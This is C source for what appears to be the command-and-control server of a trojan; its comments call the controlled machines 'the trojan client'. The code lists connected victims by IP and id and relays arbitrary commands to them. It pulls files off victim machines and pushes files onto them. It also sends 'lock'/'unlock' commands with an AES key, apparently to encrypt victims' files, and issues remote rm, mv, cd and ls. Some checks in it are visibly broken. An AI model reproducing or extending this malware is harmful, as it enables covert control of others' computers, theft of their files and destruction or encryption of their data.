#include "server.h"
#include "mycommand.h"
#include "myutils.h"
#include <string.h>
#include <arpa/inet.h>
#include <setjmp.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <malloc.h>


#define generateCommandTimes(type, value) \
void type##Command(client *c) {\
	client *cl = genericGetClient(c);\
	if(cl == NULL){\
		addReply(c, shared.err);\
		return;\
	}\
\
	addReply(cl, shared.mbulkhdr[value]);\
	addReplyBulkCString(cl, ""#type);\
	for(int i = 1; i < value; i++) \
		addReplyBulkCString(cl, c->argv[i + 1]->ptr);\
\
	addReply(c, shared.ok);\
\
}

extern jmp_buf jmp_env;

client* genericGetClient(client* c){
	listNode *ln;
	listIter li;

	if(c->enable_client != true || c->is_control != true || c->argv[1]->type != OBJ_STRING){
		addReply(c, shared.err);
		return NULL;
	}

	client* cl = NULL;
	listRewind(server.clients, &li);
	while((ln = listNext(&li))){
		cl = listNodeValue(ln);
		if(!cl || !cl->hashid){
			cl = NULL;
			continue;
		}
		if(!strcasecmp(c->argv[1]->ptr, cl->hashid)){
			break;
		}
		cl = NULL;
	}
	return cl;
}

void enableCommand(client *c){
	listNode *ln;
	listIter li;
	if(c->argc == 3 && !strncmp(c->argv[1]->ptr, "1", 1)){
		listRewind(server.clients, &li);
		while((ln = listNext(&li))){
			client *cl = listNodeValue(ln);
			if(cl || !cl->hashid)
				continue;
			if(!strcasecmp(c->argv[2]->ptr, cl->hashid)){
				addReply(c, shared.err);
				c->flags |= CLIENT_CLOSE_AFTER_REPLY;
				return;
			}
		}
		c->hashid = sdsnew(c->argv[2]->ptr);
		c->enable_client = true;
		c->is_control = false;
		addReply(c, shared.ok);
	}
	else if(c->argc == 3 && !strncmp(c->argv[1]->ptr, "2", 1) && (!server.secretphrase || !strncmp(c->argv[2]->ptr, server.secretphrase, sdslen(server.secretphrase)))){
		c->enable_client = true;
		c->is_control = true;
		addReply(c, shared.ok);
	}
	else
		addReply(c, shared.err);
	return;
}

void getClientsCommand(client *c){
	listNode* ln;
	listIter li;
	char* buf[1024];
	int hasClient = 0;

	memset(buf, 0, sizeof(buf));
	listRewind(server.clients, &li);
	if(!c->enable_client || !c->is_control){
		addReply(c, shared.err);
		return;
	}

	while((ln = listNext(&li))){
		client* cl = listNodeValue(ln);
		if(!cl || !cl->enable_client || cl->is_control || cl == c){
			continue;
		}
		hasClient++;
		buf[hasClient - 1] = (char*)malloc(sizeof(char) * 1024);
		memset(buf[hasClient - 1], 0, 1024 * sizeof(char));

		struct sockaddr_in sa;
		socklen_t len = sizeof(sa);
		if(!getpeername(cl->fd, (struct sockaddr*)&sa, &len)){
			sprintf(buf[hasClient - 1] + strlen(buf[hasClient - 1]), "%s;%d;%s;", inet_ntoa(sa.sin_addr), sa.sin_port, cl->hashid);
		}
	}
	if(!hasClient){
		addReply(c, shared.emptymultibulk);
		return;
	}
	addReply(c, shared.mbulkhdr[hasClient]);
	for(int i = 0; i < hasClient; i++)
		addReplyBulkCString(c, buf[i]);

	return;
}

void sendCmdCommand(client *c){	
	client *cl = genericGetClient(c);

	if(cl == NULL){
		addReply(c, shared.err);
		return;
	}
	addReply(cl, shared.mbulkhdr[c->argc - 2]);
	for(int i = 2; i < c->argc; i++){
		addReplyBulkCString(cl, c->argv[i]->ptr);
	}

	addReply(c, shared.ok);
}

void printchar(unsigned char c){
		switch(c){
		case 0:
		case 1:
		case 2:
		case 3:
		case 4:
		case 5:
		case 6:
		case 7:
		case 8:
		case 9:
			printf("%c", c + '0');break;
		case 10:
			printf("a");break;
		case 11:
			printf("b");break;
		case 12:
			printf("c");break;
		case 13:
			printf("d");break;
		case 14:
			printf("e");break;
		case 15:
			printf("f");break;
		}
}

void printhex(unsigned char buf[], int size){
	for(int i = 0; i < size; i++){
		printchar(buf[i] >> 4);
		printchar(buf[i] & 0x0f);
	}
	printf("\n");
}

void lockCommand(client *c){
	unsigned char hash[20];
	client *cl = genericGetClient(c);
	if(cl == NULL){
		addReply(c, shared.err);
		return;
	}
	gethashforaes(sdsnew(c->argv[1]->ptr), hash);
	memset(hash + 16, 0 , 4);

	addReply(cl, shared.mbulkhdr[3]);
	if(!strcasecmp(c->argv[0]->ptr, "lock"))
		addReplyBulkCString(cl, "lock");
	else
		addReplyBulkCString(cl, "unlock");
	addReplyBulkSds(cl, sdsnewlen(hash, 16));
	addReplyBulkCString(cl, c->argv[2]->ptr);

	addReply(c, shared.ok);
	return;
}

/* file transport*/
void downloadCommand(client *c){
	volatile int tfd, cfd = c->fd;
	/* debug */
	int count, ret;
	packet pac;
	client *cl = genericGetClient(c);

	if(cl == NULL){
		addReply(c, shared.err);
		return;
	}

	//aeDeleteFileEvent(server.el, cl->fd, AE_READABLE | AE_WRITABLE);
	//aeDeleteFileEvent(server.el, c->fd, AE_READABLE | AE_WRITABLE);
	/* unregister epoll events*/

	/* send cmd to the trojan client */
	tfd = cl->fd;
	memset(&pac, 0, sizeof(pac));
	sprintf(pac.data, "*2\r\n$8\r\ndownload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[2]->ptr),(char*)c->argv[2]->ptr);
	ret = write(tfd, pac.data, strlen(pac.data));
	int flags = fcntl(tfd, F_GETFL, 0);

	cfd = open("testdownload.txt", O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
	fcntl(tfd, F_SETFL, 0);
	if(ret < 0)
		goto err;
	if(setjmp(jmp_env))
		goto err;
	if(fork()==0){
		while(1){
			memset(&pac, 0, sizeof(pac));
			alarm(5);
			count = read(tfd, &pac, sizeof(pac));

			if(count > 0){
				switch(pac.type){
				case 1:
					ret = write(cfd, pac.data, sizeof(pac.data));
					if(ret < 0)
						goto err;
					break;
				case 2:
					ret = write(cfd, pac.data, sizeof(pac.data));
					close(cfd);
//					aeCreateFileEvent(server.el, cl->fd, AE_READABLE, readQueryFromClient, cl);
//					aeCreateFileEvent(server.el, cl->fd, AE_WRITABLE, sendReplyToClient, cl);
//					aeCreateFileEvent(server.el, c->fd, AE_READABLE, readQueryFromClient, c);
//					aeCreateFileEvent(server.el, c->fd, AE_WRITABLE, sendReplyToClient, c);
					fcntl(tfd, F_SETFL, flags);
					exit(0);
				default:
					goto err;
				}
			}
			else{
err:			/* error handle*/
//				aeCreateFileEvent(server.el, cl->fd, AE_READABLE, readQueryFromClient, cl);
//				aeCreateFileEvent(server.el, cl->fd, AE_WRITABLE, sendReplyToClient, cl);
//				aeCreateFileEvent(server.el, c->fd, AE_READABLE, readQueryFromClient, c);
//				aeCreateFileEvent(server.el, c->fd, AE_WRITABLE, sendReplyToClient, c);
				pac.type = 0;
				ret = write(cfd, &pac.data, sizeof(pac.data));
				fcntl(tfd, F_SETFL, flags);
				close(cfd);
				exit(0);
			}
		}
	}

	addReply(c, shared.ok);
	return ;
}

void uploadCommand(client *c){
	struct stat stbuf;
	packet pac;
	int tfd, cfd, leftcount, count, ret;
	client *cl = genericGetClient(c);

	if(cl == NULL){
		addReply(c, shared.err);
		return;
	}

	//aeDeleteFileEvent(server.el, cl->fd, AE_READABLE | AE_WRITABLE);
	//aeDeleteFileEvent(server.el, c->fd, AE_READABLE | AE_WRITABLE);
	/* unregister epoll events*/

	/* send cmd to the trojan client */
	tfd = cl->fd;
	memset(&pac, 0, sizeof(pac));
	sprintf(pac.data, "*2\r\n$8\r\nupload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[2]->ptr),(char*)c->argv[2]->ptr);
	ret = write(tfd, pac.data, strlen(pac.data));
	int flags = fcntl(tfd, F_GETFL, 0);

	if(setjmp(jmp_env))
		goto err;
	if(fork() == 0){
		fcntl(tfd, F_SETFL, 0);
		cfd = open("testdownload.txt", O_RDWR);
		if(fstat(cfd, &stbuf) != 0)
			exit(0);
		leftcount = stbuf.st_size;
		while(1){
			memset(&pac, 0, sizeof(pac));
			alarm(5);
			count = read(cfd, &pac.data, sizeof(pac.data));
			leftcount -= count;
			if(count > 0){
				if(leftcount > 0)
					pac.type = 2;
				else
					pac.type = 1;
				ret = write(tfd, &pac, sizeof(pac));
				if(ret < 0)
					goto err;
			}
			else{
err:			/* error handle*/
				pac.type = 0;
				ret = write(tfd, &pac.data, sizeof(pac.data));
				fcntl(tfd, F_SETFL, flags);
				close(cfd);
				exit(0);
			}
		}
	}

	addReply(c, shared.ok);
	return;
}

void lsCommand(client *c){
	int ret;
	char buff[1024 * 16];
	client *cl = genericGetClient(c);

	if(cl == NULL){
		addReply(c, shared.err);
		return;
	}

	sprintf(buff, "*1\r\n$2\r\nls\r\n");
	ret = write(cl->fd, buff, strlen(buff));
	int flags = fcntl(cl->fd, F_GETFL, 0);

	if(fork() == 0){
		if(setjmp(jmp_env))
			goto err;
		fcntl(cl->fd, F_SETFL, 0);
		memset(buff, 0, sizeof(buff));
		alarm(3);
		int count = read(cl->fd, buff, sizeof(buff));
		if(count > 0){
			ret = write(c->fd, buff, strlen(buff));
			if(ret < 0)
				goto err;
			exit(0);
		}
err:			/* error handle*/
		addReply(c, shared.err);
		fcntl(cl->fd, F_SETFL, flags);
		exit(0);
	}

	return;
}

void pwdCommand(client *c){
	int ret;
	char buff[1024 * 16];
	client *cl = genericGetClient(c);

	if(cl == NULL){
		addReply(c, shared.err);
		return;
	}

	sprintf(buff, "*1\r\n$3\r\npwd\r\n");
	ret = write(cl->fd, buff, strlen(buff));
	int flags = fcntl(cl->fd, F_GETFL, 0);


	if(fork() == 0){
		if(setjmp(jmp_env))
			goto err;
		fcntl(cl->fd, F_SETFL, 0);
		memset(buff, 0, sizeof(buff));
		alarm(3);
		int count = read(cl->fd, buff, sizeof(buff));
		if(count > 0){
			ret = write(c->fd, buff, strlen(buff));
			if(ret < 0)
				goto err;
			exit(0);
		}
err:			/* error handle*/
		addReply(c, shared.err);
		fcntl(cl->fd, F_SETFL, flags);
		exit(0);
	}

	return;
}

/*    generateComamnd using macro      */
generateCommandTimes(new, 2)
generateCommandTimes(cat, 3)
generateCommandTimes(copy, 2)
generateCommandTimes(cut, 2)
generateCommandTimes(paste, 1)
generateCommandTimes(fpaste, 1)
generateCommandTimes(rm, 2)


/* directory control */
generateCommandTimes(rmdir, 2)
generateCommandTimes(cd, 2)
generateCommandTimes(mv, 3)
generateCommandTimes(newdir, 2)

generateCommandTimes(up, 1)
generateCommandTimes(back, 1)
